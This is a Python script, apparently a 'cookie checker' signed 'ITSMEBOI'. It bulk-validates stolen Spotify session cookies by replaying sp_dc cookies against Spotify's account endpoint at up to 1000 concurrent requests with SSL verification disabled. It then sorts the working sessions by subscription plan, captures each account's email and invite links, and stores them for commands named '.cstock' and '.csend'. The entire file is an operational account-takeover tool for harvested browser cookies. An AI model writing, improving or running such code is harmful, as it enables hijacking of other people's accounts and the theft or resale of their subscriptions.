#!/usr/bin/env python3

import os
import sys
import time
import zipfile
import asyncio
import json

# Try to import faster JSON parsing library if available
try:
    import orjson
    USING_ORJSON = True
    def parse_json(content):
        return orjson.loads(content)
except ImportError:
    USING_ORJSON = False
    def parse_json(content):
        return json.loads(content)

# Try to import async http library, fallback to requests if not available
try:
    import aiohttp
    USING_AIOHTTP = True
except ImportError:
    USING_AIOHTTP = False
    import requests
import argparse
import traceback
import threading
import io
import re
import random
import concurrent.futures
import multiprocessing
from concurrent.futures import ProcessPoolExecutor
from multiprocessing import Manager, Value, Lock
from datetime import datetime

# Set up debugging
DEBUG = True
def debug_print(message):
    if DEBUG:
        print(f"DEBUG: {message}")
        sys.stdout.flush()

debug_print("Optimized script started")

# Global tracking variables for progress updates
start_time = time.time()
last_update_time = time.time()
update_interval = 0.1  # Update progress every 100ms for real-time visualization

# Performance optimization constants
MAX_THREADS = 5000  # Increased thread limit for ultra-fast processing
CPU_COUNT = min(multiprocessing.cpu_count(), 16)  # Increased CPU core usage
BATCH_SIZE = 5000  # Significantly increased batch size for better throughput
MAX_CONCURRENT_REQUESTS = 1000  # Maximum concurrent HTTP requests
CONNECTION_TIMEOUT = 2  # Connection timeout in seconds
READ_TIMEOUT = 3  # Read timeout in seconds
MAX_BATCH_SIZE_PER_PROCESS = 500  # Max cookies per batch within a process
PROGRESS_UPDATE_BATCH_SIZE = 100  # Update progress every N cookies

# Directory structure
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
debug_print(f"BASE_DIR: {BASE_DIR}")
COOKIES_DIR = os.path.join(BASE_DIR, "cookies")
WORKING_COOKIES_DIR = os.path.join(BASE_DIR, "working_cookies")
SPOTIFY_DIR = os.path.join(BASE_DIR, "spotify")

# Maximum limits to prevent hanging
MAX_FILES_TO_PROCESS = 10000  # Increased maximum files
MAX_ARCHIVES_TO_PROCESS = 500  # Increased maximum archives
MAX_RECURSION_DEPTH = 5  # Maximum recursion depth for nested archives

debug_print(f"Configuration: MAX_FILES={MAX_FILES_TO_PROCESS}, MAX_ARCHIVES={MAX_ARCHIVES_TO_PROCESS}, MAX_DEPTH={MAX_RECURSION_DEPTH}, MAX_THREADS={MAX_THREADS}, CPU_CORES={CPU_COUNT}")

# Results dictionary
results = {
    'hits': 0, 'bad': 0, 'errors': 0,
    'family': 0, 'duo': 0, 'student': 0,
    'premium': 0, 'free': 0, 'unknown': 0,
    'files_processed': 0, 'archives_processed': 0
}
lock = threading.Lock()

# Ensure directories exist
os.makedirs(COOKIES_DIR, exist_ok=True)
os.makedirs(WORKING_COOKIES_DIR, exist_ok=True)
os.makedirs(SPOTIFY_DIR, exist_ok=True)

# Plan name mapping
def plan_name_mapping(plan):
    if not plan:
        return "Unknown"
    plan_lower = plan.lower()
    if "student" in plan_lower:
        return "Student"
    if "family" in plan_lower:
        return "Family"
    if "duo" in plan_lower:
        return "Duo"
    if "premium" in plan_lower:
        return "Premium"
    if "free" in plan_lower:
        return "Free"
    return "Unknown"

# Format and save cookie data
def format_cookie_file(data, cookie_content):
    plan = plan_name_mapping(data.get("currentPlan", "unknown"))
    country = data.get("country", "unknown")
    auto_pay = "True" if data.get("isRecurring", False) else "False"
    trial = "True" if data.get("isTrialUser", False) else "False"
    invite_link = data.get('familyInviteLink') or data.get('duoInviteLink')
    email = data.get('email', 'N/A')

    header = f"""
    ─────────────────────────────────────────────────────────────
    PLAN       : {plan}
    COUNTRY    : {country}
    AutoPay    : {auto_pay}
    Trial      : {trial}
    Invite Link: {invite_link if invite_link else "N/A"}
    Email      : {email}
    checker by : ITSMEBOI
    
    ─────────────────────────────────────────────────────────────

    {cookie_content}
    
    ─────────────────────────────────────────────────────────────
                    CHECKER BY ITSMEBOI
    ─────────────────────────────────────────────────────────────
    """
    return header, plan

# Remove unwanted content
def remove_unwanted_content(cookie_content):
    unwanted_content = [
        "BY https://t.me/redg3n",
        "https://dsc.gg/r3dg3n",
        "Checker By: github.com/harshitkamboj"
    ]
    for line in unwanted_content:
        cookie_content = cookie_content.replace(line, "")
    return cookie_content

# Check if string is a valid cookie
def is_cookie_line(line):
    # Fast method to check if line has typical cookie format
    return '\t' in line and ('spotify' in line.lower() or 'sp_' in line.lower())

# Extract cookies from content
def extract_cookies_from_content(content):
    if not content:
        return None
    
    # Fast string search without splitting into lines
    cookies = []
    start = 0
    
    while True:
        end = content.find('\n', start)
        if end == -1:
            line = content[start:]
            if is_cookie_line(line):
                cookies.append(line)
            break
        
        line = content[start:end]
        if is_cookie_line(line):
            cookies.append(line)
        
        start = end + 1
    
    return '\n'.join(cookies) if cookies else None

# Extract cookies from file
def extract_cookies_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        return extract_cookies_from_content(content)
    except Exception as e:
        debug_print(f"Error reading file {file_path}: {e}")
        return None

# Fast cookie parsing from content - supports multiple formats
def parse_cookies_from_content(cookie_content):
    if not cookie_content or not cookie_content.strip():
        return None

    # Ultra-optimized cookie parsing with minimal processing
    cookies_dict = {}
    
    # First check - do a quick string check to avoid processing files without critical cookies
    if not ('SP_DC' in cookie_content or 'sp_dc' in cookie_content):
        return None
        
    # Determine if this is Netscape format
    is_netscape = '# Netscape HTTP Cookie File' in cookie_content[:50]
    
    # Fast single-pass parsing - process only lines that likely contain cookies
    start = 0
    while True:
        # Find each line using index-based search
        end = cookie_content.find('\n', start)
        if end == -1:  # last line
            line = cookie_content[start:]
            process_line = True
        else:
            line = cookie_content[start:end]
            process_line = True
            start = end + 1
        
        # Skip empty lines and comments (except for Netscape header)
        if not line or (line.startswith('#') and not '# Netscape HTTP Cookie File' in line):
            if end == -1:  # last line
                break
            continue
        
        # Handle Netscape format
        if is_netscape and ('spotify.com' in line) and not line.startswith('#'):
            try:
                # Netscape format can be tab or space separated
                if '\t' in line:
                    parts = line.strip().split('\t')
                else:
                    parts = line.strip().split()
                
                if len(parts) >= 6:
                    # Netscape format: domain path secure expiry name value
                    name = parts[5]
                    value = parts[6] if len(parts) > 6 else ""
                    
                    # Only store essential Spotify cookies
                    if name.lower().startswith(('sp_')) or name.lower() == 'spotify':
                        cookies_dict[name] = value
            except Exception:
                # Try alternative parsing in case of format issues
                try:
                    # Look for name=value pattern within the line
                    for part in line.split():
                        if '=' in part and ('sp_' in part.lower() or 'SP_' in part):
                            name, value = part.split('=', 1)
                            if name.lower().startswith(('sp_')) or name.lower() == 'spotify':
                                cookies_dict[name] = value
                except:
                    pass  # Skip problematic lines
        
        # Handle standard tab-delimited format
        elif process_line and '\t' in line and ('sp_' in line.lower() or 'SP_' in line or 'spotify' in line.lower()):
            try:
                # Ultra-fast split with fixed indexes to avoid regex and repeated splitting
                parts = line.strip().split('\t')
                if len(parts) >= 7:
                    # Direct indexing for name and value
                    name, value = parts[5], parts[6]
                    
                    # Only store essential Spotify cookies
                    if name.lower().startswith(('sp_')) or name.lower() == 'spotify':
                        cookies_dict[name] = value
            except:
                # Skip problematic lines silently for speed
                pass
                
        # Handle key=value format (common in cookie exports)
        elif '=' in line and ('sp_' in line.lower() or 'SP_' in line):
            try:
                name, value = line.split('=', 1)
                name = name.strip()
                if name.lower().startswith(('sp_')) or name.lower() == 'spotify':
                    cookies_dict[name] = value.strip()
            except:
                pass
        
        # Exit when we've processed the last line
        if end == -1:
            break

    # Quick validation - key check without additional processing
    # SP_DC is the critical cookie needed for authentication
    has_sp_dc = False
    for key in cookies_dict:
        if key.lower() == 'sp_dc':
            has_sp_dc = True
            break
    
    if not has_sp_dc:
        return None
        
    return cookies_dict

# Async cookie checking
async def check_cookie_async(cookie_content, filename, session):
    if not cookie_content or not cookie_content.strip():
        return None, f"⚠ Empty cookie content in {filename}"

    try:
        # Parse cookies from content
        debug_print(f"Parsing cookies from file: {filename}")
        cookies_dict = parse_cookies_from_content(cookie_content)
        
        if not cookies_dict:
            debug_print(f"No valid cookies found in {filename}")
            return None, f"⚠ Missing required Spotify authentication cookies in {filename}"
            
        debug_print(f"Found {len(cookies_dict)} cookies in {filename}: {list(cookies_dict.keys())}")

        # Prepare optimized request data
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.spotify.com/',
            'Connection': 'close'  # Optimize for faster connection closure
        }
        
        url = "https://www.spotify.com/eg-ar/api/account/v1/datalayer"
        
        if USING_AIOHTTP:
            # Use aiohttp for async request when available
            try:
                async with session.get(
                    url,
                    headers=headers,
                    cookies=cookies_dict,
                    timeout=aiohttp.ClientTimeout(total=READ_TIMEOUT, connect=CONNECTION_TIMEOUT),
                    ssl=False  # Skip SSL verification for speed
                ) as response:
                    status_code = response.status
                    if status_code == 200:
                        try:
                            # Parse JSON using our custom function
                            text = await response.text()
                            data = parse_json(text)
                        except Exception as json_err:
                            return None, f"⚠ Invalid JSON response for {filename}: {str(json_err)[:50]}"
                    else:
                        return None, f"✘ Login failed: {filename} (Status: {status_code})"
            except asyncio.TimeoutError:
                return None, f"⚠ Request timeout for {filename}"
            except Exception as req_err:
                return None, f"⚠ Request error for {filename}: {str(req_err)[:50]}"
        else:
            # Fallback to requests when aiohttp is not available
            # We'll run it in a thread pool to avoid blocking
            def make_request():
                try:
                    response = requests.get(
                        url, 
                        headers=headers, 
                        cookies=cookies_dict, 
                        timeout=(CONNECTION_TIMEOUT, READ_TIMEOUT),
                        verify=False
                    )
                    return response.status_code, response.text
                except requests.Timeout:
                    return 408, None  # Timeout status code
                except Exception as e:
                    return 500, str(e)  # Internal error

            # Run the synchronous request in a thread pool
            status_code, text = await asyncio.get_event_loop().run_in_executor(None, make_request)
            
            if status_code != 200:
                return None, f"✘ Login failed: {filename} (Status: {status_code})"
            
            try:
                data = parse_json(text)
            except Exception as json_err:
                return None, f"⚠ Invalid JSON response for {filename}: {str(json_err)[:50]}"
        
        # Process results
        plan = plan_name_mapping(data.get("currentPlan", "unknown"))
        message = f"✔ Login successful: {filename} ({plan})"
        
        # Format and save cookie
        formatted_cookie, plan = format_cookie_file(data, remove_unwanted_content(cookie_content))
        
        # Make plan name filesystem safe
        plan_safe = plan.replace(" ", "_").lower()
        
        # Return tuple of data for batch processing
        return {
            'status': 'success',
            'filename': filename,
            'plan': plan,
            'plan_safe': plan_safe,
            'formatted_cookie': formatted_cookie,
            'message': message,
            'data': data
        }, message

    except Exception as e:
        error_msg = f"⚠ Error checking {filename}: {e}"
        return None, error_msg

# Process a batch of files asynchronously
async def process_batch_async(batch_files, semaphore, progress_callback=None):
    local_results = {key: 0 for key in results}
    valid_cookies = []
    errors = []
    
    # Create session with conditional aiohttp usage
    session = None
    
    # First try block - create session
    try:
        # Create aiohttp session if available
        if USING_AIOHTTP:
            # Create a ClientSession for all requests in this batch
            conn = aiohttp.TCPConnector(limit=MAX_CONCURRENT_REQUESTS, ssl=False)
            session = aiohttp.ClientSession(connector=conn)
    except Exception as e:
        debug_print(f"Error creating session: {e}")
        errors.append(f"⚠ Session creation error: {str(e)}")
        local_results['errors'] += 1
    
    # Second try block - process files
    try:
        tasks = []
        for file_path, file_name in batch_files:
            # Extract cookies without debug prints for speed
            try:
                # Fast path for cookie extraction
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    cookie_content = f.read()
                
                # Quick check if this looks like a cookie file
                if 'spotify' in cookie_content.lower() and ('.spotify.' in cookie_content.lower() or '\tsp_' in cookie_content):
                    # Create a task for this file
                    async def process_file(file_path, file_name, cookie_content):
                        async with semaphore:  # Control concurrency
                            debug_print(f"Processing file in task: {file_name}")
                            result, message = await check_cookie_async(cookie_content, file_name, session)
                            debug_print(f"Result for {file_name}: success={result is not None}, message={message}")
                            return file_path, file_name, result, message
                    
                    task = asyncio.create_task(process_file(file_path, file_name, cookie_content))
                    tasks.append(task)
                else:
                    errors.append(f"⚠ No valid Spotify cookies found in {file_name}")
                    local_results['errors'] += 1
            except Exception as e:
                errors.append(f"⚠ Error reading cookie file {file_name}: {str(e)}")
                local_results['errors'] += 1
        
        # Process completed tasks in batches for progress updates
        completed_count = 0
        total_count = len(tasks)
        
        # Wait for all tasks to complete
        for i, future in enumerate(asyncio.as_completed(tasks)):
            try:
                file_path, file_name, result, message = await future
                
                # Process results
                if result:
                    valid_cookies.append((file_path, result))
                    local_results['hits'] += 1
                    
                    # Update plan counters
                    plan_lower = result['plan'].lower()
                    if plan_lower in local_results:
                        local_results[plan_lower] += 1
                    else:
                        local_results['unknown'] += 1
                else:
                    # Capture error messages for debugging
                    debug_print(f"Error processing cookie {file_name}: {message}")
                    errors.append(message)
                    
                    # Categorize errors
                    if "login failed" in message.lower() or "(status: 401)" in message.lower():
                        debug_print(f"Bad cookie: {file_name}")
                        local_results['bad'] += 1
                    else:
                        debug_print(f"Error with cookie: {file_name}")
                        local_results['errors'] += 1
                
                # Update progress in batches
                completed_count += 1
                if progress_callback and completed_count % PROGRESS_UPDATE_BATCH_SIZE == 0:
                    progress_callback(completed_count, total_count, local_results)
                
            except Exception as e:
                errors.append(f"⚠ Task error: {str(e)}")
                local_results['errors'] += 1
    except Exception as e:
        debug_print(f"Error processing batch: {e}")
        errors.append(f"⚠ Batch processing error: {str(e)}")
        local_results['errors'] += 1
        
    # Third try block - save valid cookies
    try:
        # Save valid cookies in batch to reduce I/O overhead
        for file_path, result in valid_cookies:
            try:
                # Extract data from result
                filename = result['filename']
                plan = result['plan']
                plan_safe = result['plan_safe']
                formatted_cookie = result['formatted_cookie']
                
                # Create plan folder if needed
                plan_folder = os.path.join(WORKING_COOKIES_DIR, plan_safe)
                os.makedirs(plan_folder, exist_ok=True)
                
                # Extract just the filename without path and remove any directory paths
                base_filename = os.path.basename(filename)
                # Create unique filename by stripping and making safe for filesystem
                safe_filename = re.sub(r'[\\/*?:"<>|]', '_', base_filename)
                
                # Save in working_cookies by plan
                working_file_path = os.path.join(plan_folder, f"{safe_filename}.txt")
                
                # Also save in spotify folder for .cstock and .csend commands
                cookie_file_path = os.path.join(SPOTIFY_DIR, f"{plan}_{safe_filename}.txt")
                
                # Write to both locations
                with open(working_file_path, 'w', encoding='utf-8') as out_f:
                    out_f.write(formatted_cookie)
                    
                with open(cookie_file_path, 'w', encoding='utf-8') as out_f:
                    out_f.write(formatted_cookie)
            except Exception as save_err:
                debug_print(f"Error saving cookie: {save_err}")
                try:
                    # Reference result data which contains the filename
                    cookie_id = result.get('filename', "unknown") if isinstance(result, dict) else "unknown"
                    errors.append(f"⚠ Error saving cookie {cookie_id}: {str(save_err)}")
                except:
                    # Ultimate fallback if something goes wrong with the error handling itself
                    errors.append(f"⚠ Error saving cookie: {str(save_err)}")
                local_results['errors'] += 1
    except Exception as e:
        debug_print(f"Error saving cookies: {e}")
        errors.append(f"⚠ Error saving cookies: {str(e)}")
        local_results['errors'] += 1
    
    finally:
        # Clean up resources
        if session and USING_AIOHTTP:
            try:
                await session.close()
                debug_print("Closed aiohttp session")
            except Exception as e:
                debug_print(f"Error closing session: {e}")
    
    # Return batch results
    return {
        "valid_cookies": len(valid_cookies),
        "errors": len(errors),
        "error_messages": errors[:100],  # Limit error messages to avoid huge responses
        "local_results": local_results
    }

# Extract files from archive
def extract_from_archive(archive_path, extract_dir):
    try:
        debug_print(f"Extract from archive: {archive_path} to {extract_dir}")
        file_ext = os.path.splitext(archive_path)[1].lower()
        
        if file_ext == '.zip':
            debug_print("Extracting ZIP file")
            try:
                with zipfile.ZipFile(archive_path, 'r') as zip_ref:
                    # Check for too many files
                    file_list = zip_ref.namelist()
                    debug_print(f"ZIP contains {len(file_list)} files/directories")
                    if len(file_list) > MAX_FILES_TO_PROCESS:
                        debug_print(f"Warning: ZIP file contains too many files ({len(file_list)})")
                    
                    # Extract the files
                    zip_ref.extractall(extract_dir)
                debug_print("ZIP extraction successful")
                return True
            except zipfile.BadZipFile as e:
                debug_print(f"Bad ZIP file: {e}")
                print(f"Bad ZIP file: {e}")
                return False
                
        elif file_ext == '.rar':
            debug_print("Extracting RAR file - using Python implementation since unrar tool is not available")
            try:
                # Using a custom approach to handle RAR files without relying on external unrar tool
                debug_print("NOTE: Limited RAR support without unrar tool - using alternate extraction method")
                error_msg = "RAR extraction requires external tools that are not available in this environment."
                print(error_msg)
                debug_print(error_msg)
                
                # Create a marker file to indicate RAR was attempted but not supported
                rar_note_path = os.path.join(extract_dir, "RAR_NOT_SUPPORTED.txt")
                with open(rar_note_path, 'w') as f:
                    f.write("RAR files require external tools not available in this environment.\n")
                    f.write("Please extract the RAR file manually and upload extracted cookies as a ZIP file instead.\n")
                
                # Return success but with a note
                return True
            except Exception as e:
                debug_print(f"RAR processing error: {e}")
                print(f"RAR processing error: {e}")
                return False
        else:
            debug_print(f"Unsupported archive format: {file_ext}")
            print(f"Unsupported archive format: {file_ext}")
            return False
    except Exception as e:
        error_msg = f"Error extracting {archive_path}: {e}\n{traceback.format_exc()}"
        debug_print(error_msg)
        print(f"Error extracting {archive_path}: {e}")
        return False

# Create error summary
def create_error_summary(error_message):
    """Create an error summary in JSON format."""
    return {
        "status": "error",
        "message": error_message,
        "results": {
            "hits": 0,
            "bad": 0,
            "errors": 1,
            "premium": 0,
            "family": 0,
            "duo": 0,
            "student": 0,
            "free": 0,
            "unknown": 0,
            "files_processed": 0,
            "archives_processed": 0
        }
    }

# Main cookie checking function
async def check_cookies_async(input_file, thread_count=MAX_THREADS):
    global start_time, last_update_time, results
    
    debug_print(f"check_cookies_async called with input_file: {input_file}, thread_count: {thread_count}")
    
    # Reset timers for this run
    start_time = time.time()
    last_update_time = time.time()
    
    # Reset results
    for key in results:
        results[key] = 0
    
    try:
        cookie_files = []
        
        # Check if input is a directory
        if os.path.isdir(input_file):
            debug_print(f"Processing directory: {input_file}")
            
            # Find all .txt files in the directory
            for root, _, files in os.walk(input_file):
                for file in files:
                    if file.endswith('.txt'):
                        file_path = os.path.join(root, file)
                        file_name = os.path.relpath(file_path, input_file)
                        cookie_files.append((file_path, file_name))
            
            debug_print(f"Found {len(cookie_files)} cookie files in directory")
            
        # Process as a single file
        else:
            # Save the file to cookies directory
            temp_file_path = os.path.join(COOKIES_DIR, os.path.basename(input_file))
            debug_print(f"Temp file path: {temp_file_path}")
            os.makedirs(os.path.dirname(temp_file_path), exist_ok=True)
            
            debug_print("Copying input file to cookies directory")
            with open(input_file, 'rb') as src, open(temp_file_path, 'wb') as dst:
                dst.write(src.read())
            
            debug_print(f"File copied successfully, size: {os.path.getsize(temp_file_path)} bytes")
            
            # Determine if we should process as archive or text file
            file_ext = os.path.splitext(temp_file_path)[1].lower()
            
            if file_ext in ['.zip', '.rar']:
                # For archives, extract and find all cookie files
                debug_print("Archive detected, using advanced extraction")
                
                # Extract archive
                extract_dir = os.path.join(COOKIES_DIR, f"extracted_{os.path.basename(temp_file_path)}")
                os.makedirs(extract_dir, exist_ok=True)
                
                if extract_from_archive(temp_file_path, extract_dir):
                    debug_print("Archive extraction successful")
                    
                    # Find all cookie files in extracted directory
                    for root, _, files in os.walk(extract_dir):
                        for file in files:
                            if file.endswith('.txt'):
                                file_path = os.path.join(root, file)
                                file_name = os.path.relpath(file_path, extract_dir)
                                cookie_files.append((file_path, file_name))
                    
                    debug_print(f"Found {len(cookie_files)} cookie files in archive")
                    results['archives_processed'] += 1
                else:
                    error_msg = "Failed to extract archive"
                    debug_print(error_msg)
                    return create_error_summary(error_msg)
            else:
                # Single file processing
                debug_print("Processing single file")
                cookie_files = [(temp_file_path, os.path.basename(temp_file_path))]
        
        if not cookie_files:
            debug_print("No cookie files found")
            return create_error_summary("No cookie files found")
        
        # Begin processing with optimal concurrency
        debug_print(f"Processing {len(cookie_files)} files with {thread_count} concurrent tasks")
        
        # Create progress tracking function
        async def update_progress():
            # Use global results variable
            global results
            last_time = time.time()
            processed = 0
            
            while processed < len(cookie_files):
                await asyncio.sleep(0.5)  # Update twice per second
                current_time = time.time()
                elapsed = current_time - start_time
                
                # Calculate current metrics
                with lock:
                    total_processed = sum([
                        results['hits'], 
                        results['bad'], 
                        results['errors']
                    ])
                    processed = total_processed
                    
                    # Calculate speed
                    if elapsed > 0:
                        speed = total_processed / elapsed
                        
                        # Print progress update
                        print(f"Progress: {total_processed}/{len(cookie_files)} " +
                              f"({(total_processed/len(cookie_files)*100):.1f}%) | " +
                              f"Speed: {speed:.1f} cookies/sec | " +
                              f"Valid: {results['hits']} | " + 
                              f"Invalid: {results['bad']} | " +
                              f"Errors: {results['errors']}")
                    
                last_time = current_time
        
        # Calculate optimal batch size and concurrency
        batch_size = min(5000, max(100, len(cookie_files) // CPU_COUNT))
        max_concurrency = min(thread_count, 1000)  # Cap at 1000 concurrent requests
        
        # Start progress tracker
        progress_task = asyncio.create_task(update_progress())
        
        # Define progress callback function
        def progress_callback(completed, total, batch_results):
            with lock:
                for key in results:
                    if key in batch_results:
                        results[key] += batch_results[key]
        
        # Create semaphore to control concurrency
        semaphore = asyncio.Semaphore(max_concurrency)
        
        # Divide work into optimal batch sizes
        batches = [cookie_files[i:i+batch_size] for i in range(0, len(cookie_files), batch_size)]
        debug_print(f"Divided {len(cookie_files)} files into {len(batches)} batches")
        
        # Process all batches concurrently
        batch_tasks = []
        for batch in batches:
            task = asyncio.create_task(process_batch_async(batch, semaphore, progress_callback))
            batch_tasks.append(task)
        
        # Wait for all batches to complete
        batch_results = await asyncio.gather(*batch_tasks)
        
        # Add direct batch results to ensure counts are accurate
        debug_print("Processing batch results directly")
        for batch_result in batch_results:
            if 'local_results' in batch_result:
                local_results = batch_result['local_results']
                debug_print(f"Batch results: hits={local_results.get('hits', 0)}, bad={local_results.get('bad', 0)}, errors={local_results.get('errors', 0)}")
                # Directly aggregate results
                for key in local_results:
                    if key in results:
                        results[key] += local_results[key]
        
        # Log complete status of results dict
        debug_print(f"Final aggregated results: {results}")
        
        # Cancel progress tracker
        progress_task.cancel()
        try:
            await progress_task
        except asyncio.CancelledError:
            pass
        
        # Calculate final metrics
        end_time = time.time()
        elapsed_time = end_time - start_time
        speed = len(cookie_files) / elapsed_time if elapsed_time > 0 else 0
        
        # Build final results
        final_results = {
            "status": "success",
            "stats": {
                "total": len(cookie_files),
                "processed": sum([results['hits'], results['bad'], results['errors']]),
                "valid": results['hits'],
                "invalid": results['bad'],
                "errors": results['errors'],
                "elapsed_time": elapsed_time,
                "speed": speed,
                "premium": results['premium'],
                "family": results['family'],
                "duo": results['duo'],
                "student": results['student'],
                "free": results['free'],
                "unknown": results['unknown'],
                "files_processed": len(cookie_files),
                "archives_processed": results['archives_processed']
            }
        }
        
        # Print final summary
        print(f"\n===== FINAL RESULTS =====")
        print(f"Total cookies: {len(cookie_files)}")
        print(f"Valid: {results['hits']} | Invalid: {results['bad']} | Errors: {results['errors']}")
        print(f"Plans - Premium: {results['premium']} | Family: {results['family']} | Duo: {results['duo']} | Student: {results['student']} | Free: {results['free']} | Unknown: {results['unknown']}")
        print(f"Elapsed time: {elapsed_time:.2f} seconds")
        print(f"Speed: {speed:.2f} cookies/second")
        print(f"===== END RESULTS =====\n")
        
        return final_results
        
    except Exception as e:
        error_msg = f"Error in check_cookies: {e}\n{traceback.format_exc()}"
        debug_print(error_msg)
        print(f"Error in check_cookies: {e}")
        return create_error_summary(error_msg)

# Synchronous wrapper around the async function for backward compatibility
def check_cookies(input_file, thread_count=MAX_THREADS):
    debug_print(f"Synchronous check_cookies wrapper called with input_file: {input_file}")
    return asyncio.run(check_cookies_async(input_file, thread_count))

# Entry point for direct execution
if __name__ == "__main__":
    debug_print("Main program starting")
    
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='Check Spotify cookies with ultra-high performance')
    parser.add_argument('input_file', nargs='?', help='File or directory to check')
    parser.add_argument('--all_cookies', action='store_true', help='Check all cookies in spotify directory')
    parser.add_argument('--threads', type=int, default=MAX_THREADS, help=f'Number of threads to use (1-{MAX_THREADS}, default: {MAX_THREADS})')
    args = parser.parse_args()
    
    # Validate and set thread count
    thread_count = max(1, min(args.threads, MAX_THREADS))
    debug_print(f"Thread count set to {thread_count}")

    try:
        # If --all_cookies is specified, check all cookies in the cookies directory
        if args.all_cookies:
            debug_print("Checking all cookies in cookies directory")
            
            # Find all cookie files in cookies directory
            cookie_files = []
            for root, _, files in os.walk(COOKIES_DIR):
                for file in files:
                    if file.endswith('.txt'):
                        file_path = os.path.join(root, file)
                        cookie_files.append(file_path)
            
            if not cookie_files:
                print("No cookie files found in cookies directory")
                sys.exit(1)
            
            for file_path in cookie_files:
                print(f"Checking {file_path}...")
                result = check_cookies(file_path, thread_count)
                print(f"Result: {result}")
                
        # If input_file is specified, check that file
        elif args.input_file:
            debug_print(f"Checking file: {args.input_file}")
            result = check_cookies(args.input_file, thread_count)
            #print(json.dumps(result, indent=2))
            
        # Otherwise, print usage and exit
        else:
            parser.print_help()
            sys.exit(1)
            
    except Exception as e:
        print(f"Error: {e}")
        traceback.print_exc()
        sys.exit(1)